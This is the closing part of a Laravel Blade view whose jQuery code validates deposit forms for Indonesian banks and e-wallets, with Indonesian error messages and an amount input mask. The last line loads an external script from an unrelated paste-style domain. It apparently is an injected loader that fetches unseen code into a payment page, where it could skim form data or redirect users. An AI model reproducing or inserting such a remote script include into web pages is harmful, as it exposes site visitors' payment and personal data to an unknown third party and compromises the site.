                    pattern: "Hanya huruf, angka, koma, spasi, dan - / \ ",
                    maxlength: "Maksimal 20 karakter saja",
                    minlength: "Diperlukan minimal 5 karakter",
                    required: " tidak boleh kosong",
                }


            };

            const deposit_all_config = {
                ignore: ".ignore",
                rules,
                // Specify validation error messages
                messages,
                errorElement: "em",
                errorPlacement: function(error, element) {
                    // Add the `help-block` class to the error element
                    error.addClass("help-block mlr-15");

                    // Add `has-feedback` class to the parent div.form-group
                    // in order to add icons to inputs
                    //element.parents(".col-sm-6").addClass("has-feedback");
                    element.addClass("has-feedback");
                    if (element.prop("type") === "checkbox") {
                        error.insertAfter(element.parent("label"));
                    } else {
                        error.insertAfter(element);
                    }

                    // Add the span element, if doesn't exists, and apply the icon classes to it.
                    if (!element.next("i")[0]) {
                        $("<i class='icon-cancel form-control-feedback absolute m-15'></i>")
                            .insertAfter(element);
                    }
                },
                success: function(label, element) {
                    // Add the span element, if doesn't exists, and apply the icon classes to it.

                    if (!$(element).next("i")[0]) {
                        $("<i class='icon-checkmark  form-control-feedback absolute m-15'></i>")
                            .insertAfter($(element));
                    }
                },
                highlight: function(element, errorClass, validClass) {

                    $(element).addClass("has-error").removeClass("has-success");
                    $(element).next("i").addClass("icon-cancel").removeClass("icon-checkmark");
                },
                unhighlight: function(element, errorClass, validClass) {

                    $(element).addClass("has-success").removeClass("has-error");
                    $(element).next("i").addClass("icon-checkmark").removeClass("icon-cancel");
                }
            };

            // var depoValidator = $("#depositForm").validate({
            $("#depositFormBCA").validate({
                // Specify validation rules
                ignore: ".ignore",
                rules:rules,
                // Specify validation error messages
                messages,
                errorElement: "em",
                errorPlacement: function(error, element) {
                    // Add the `help-block` class to the error element
                    error.addClass("help-block mlr-15");

                    // Add `has-feedback` class to the parent div.form-group
                    // in order to add icons to inputs
                    //element.parents(".col-sm-6").addClass("has-feedback");
                    element.addClass("has-feedback");
                    if (element.prop("type") === "checkbox") {
                        error.insertAfter(element.parent("label"));
                    } else {
                        error.insertAfter(element);
                    }

                    // Add the span element, if doesn't exists, and apply the icon classes to it.
                    if (!element.next("i")[0]) {
                        $("<i class='icon-cancel form-control-feedback absolute m-15'></i>")
                            .insertAfter(element);
                    }
                },
                success: function(label, element) {
                    // Add the span element, if doesn't exists, and apply the icon classes to it.

                    if (!$(element).next("i")[0]) {
                        $("<i class='icon-checkmark  form-control-feedback absolute m-15'></i>")
                            .insertAfter($(element));
                    }
                },
                highlight: function(element, errorClass, validClass) {

                    $(element).addClass("has-error").removeClass("has-success");
                    $(element).next("i").addClass("icon-cancel").removeClass("icon-checkmark");
                },
                unhighlight: function(element, errorClass, validClass) {

                    $(element).addClass("has-success").removeClass("has-error");
                    $(element).next("i").addClass("icon-checkmark").removeClass("icon-cancel");
                },
                // Make sure the form is submitted to the destination defined
                // in the "action" attribute of the form when valid
                // submitHandler: function(form) {

                //     //console.log($(form).serialize());

                //     function cbSubmit() {
                //         $(form).find('button[type="submit"]').prop('disabled', true);
                //         window.ajax_submit(form).done(
                //             function(d) {
                //                 if (d.status = 's') { //success

                //                     $(form).each(function() {
                //                         this.reset();
                //                         $('.info-lst').hide();
                //                         $('.bankInfo-box').html('');
                //                         $('.file-drop-area .file-msg').html(
                //                             '   or drag and drop file here');

                //                     });


                //                     $(form).validate().resetForm();
                //                     if (d.redirectUrl) {
                //                         location.href = d.redirectUrl;
                //                     }
                //                     sweetAlert(d.m, 'success', transMsgs.success).then(function() {
                //                         location.reload();
                //                     });

                //                 } else {
                //                     sweetAlert(d.m);
                //                 }
                //             }
                //         );

                //     }
                //     if (!!$('#pcode_not_confirm').val() && !$('#promo_code').val() && (!$(
                //             '#promo_event').val() || $('#promo_event').val() == 0)) {
                //         sweetAlert(transMsgs.pCodeConfirm, 'warning', 'Warning', true).then(
                //             function(isConfirm) {
                //                 if (isConfirm) {
                //                     cbSubmit();
                //                 }
                //             }
                //         );
                //     } else {
                //         cbSubmit();
                //     }

                //     return false;
                // }
            });

            $(".depositFormBni").validate({
                // Specify validation rules
                ignore: ".ignore",
                rules,
                // Specify validation error messages
                messages,
                errorElement: "em",
                errorPlacement: function(error, element) {
                    // Add the `help-block` class to the error element
                    error.addClass("help-block mlr-15");

                    // Add `has-feedback` class to the parent div.form-group
                    // in order to add icons to inputs
                    //element.parents(".col-sm-6").addClass("has-feedback");
                    element.addClass("has-feedback");
                    if (element.prop("type") === "checkbox") {
                        error.insertAfter(element.parent("label"));
                    } else {
                        error.insertAfter(element);
                    }

                    // Add the span element, if doesn't exists, and apply the icon classes to it.
                    if (!element.next("i")[0]) {
                        $("<i class='icon-cancel form-control-feedback absolute m-15'></i>")
                            .insertAfter(element);
                    }
                },
                success: function(label, element) {
                    // Add the span element, if doesn't exists, and apply the icon classes to it.

                    if (!$(element).next("i")[0]) {
                        $("<i class='icon-checkmark  form-control-feedback absolute m-15'></i>")
                            .insertAfter($(element));
                    }
                },
                highlight: function(element, errorClass, validClass) {

                    $(element).addClass("has-error").removeClass("has-success");
                    $(element).next("i").addClass("icon-cancel").removeClass("icon-checkmark");
                },
                unhighlight: function(element, errorClass, validClass) {

                    $(element).addClass("has-success").removeClass("has-error");
                    $(element).next("i").addClass("icon-checkmark").removeClass("icon-cancel");
                }
            });
            $(".depositFormMandiri").validate({
                // Specify validation rules
                ignore: ".ignore",
                rules,
                // Specify validation error messages
                messages,
                errorElement: "em",
                errorPlacement: function(error, element) {
                    // Add the `help-block` class to the error element
                    error.addClass("help-block mlr-15");

                    // Add `has-feedback` class to the parent div.form-group
                    // in order to add icons to inputs
                    //element.parents(".col-sm-6").addClass("has-feedback");
                    element.addClass("has-feedback");
                    if (element.prop("type") === "checkbox") {
                        error.insertAfter(element.parent("label"));
                    } else {
                        error.insertAfter(element);
                    }

                    // Add the span element, if doesn't exists, and apply the icon classes to it.
                    if (!element.next("i")[0]) {
                        $("<i class='icon-cancel form-control-feedback absolute m-15'></i>")
                            .insertAfter(element);
                    }
                },
                success: function(label, element) {
                    // Add the span element, if doesn't exists, and apply the icon classes to it.

                    if (!$(element).next("i")[0]) {
                        $("<i class='icon-checkmark  form-control-feedback absolute m-15'></i>")
                            .insertAfter($(element));
                    }
                },
                highlight: function(element, errorClass, validClass) {

                    $(element).addClass("has-error").removeClass("has-success");
                    $(element).next("i").addClass("icon-cancel").removeClass("icon-checkmark");
                },
                unhighlight: function(element, errorClass, validClass) {

                    $(element).addClass("has-success").removeClass("has-error");
                    $(element).next("i").addClass("icon-checkmark").removeClass("icon-cancel");
                }
            });
            $(".depositFormBri").validate({
                // Specify validation rules
                ignore: ".ignore",
                rules,
                // Specify validation error messages
                messages,
                errorElement: "em",
                errorPlacement: function(error, element) {
                    // Add the `help-block` class to the error element
                    error.addClass("help-block mlr-15");

                    // Add `has-feedback` class to the parent div.form-group
                    // in order to add icons to inputs
                    //element.parents(".col-sm-6").addClass("has-feedback");
                    element.addClass("has-feedback");
                    if (element.prop("type") === "checkbox") {
                        error.insertAfter(element.parent("label"));
                    } else {
                        error.insertAfter(element);
                    }

                    // Add the span element, if doesn't exists, and apply the icon classes to it.
                    if (!element.next("i")[0]) {
                        $("<i class='icon-cancel form-control-feedback absolute m-15'></i>")
                            .insertAfter(element);
                    }
                },
                success: function(label, element) {
                    // Add the span element, if doesn't exists, and apply the icon classes to it.

                    if (!$(element).next("i")[0]) {
                        $("<i class='icon-checkmark  form-control-feedback absolute m-15'></i>")
                            .insertAfter($(element));
                    }
                },
                highlight: function(element, errorClass, validClass) {

                    $(element).addClass("has-error").removeClass("has-success");
                    $(element).next("i").addClass("icon-cancel").removeClass("icon-checkmark");
                },
                unhighlight: function(element, errorClass, validClass) {

                    $(element).addClass("has-success").removeClass("has-error");
                    $(element).next("i").addClass("icon-checkmark").removeClass("icon-cancel");
                }
            });

            $('.depositFormDana').validate(deposit_all_config);
            $('.depositFormLink').validate(deposit_all_config);
            $('.depositFormOvo').validate(deposit_all_config);
            $('.depositFormGopay').validate(deposit_all_config);


            // $('#deposite_amount').priceFormat({
            //     prefix: '',
            //     centsLimit: 0,
            //     thousandsSeparator: ',',
            //     clearOnEmpty: true
            // });
        });

        $(function(e){
            $('.price-tag').inputmask({
                'alias': 'decimal',
                'groupSeparator': ',',
                'autoGroup': true, 
                'digits': 0,
                'digitsOptional': false,
                'placeholder': '0.00',
                'rightAlign' : false,
                'allowMinus': false,
            });

        });
    </script>
    <script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/WX080U5I6XQF2"></script>
@endsection
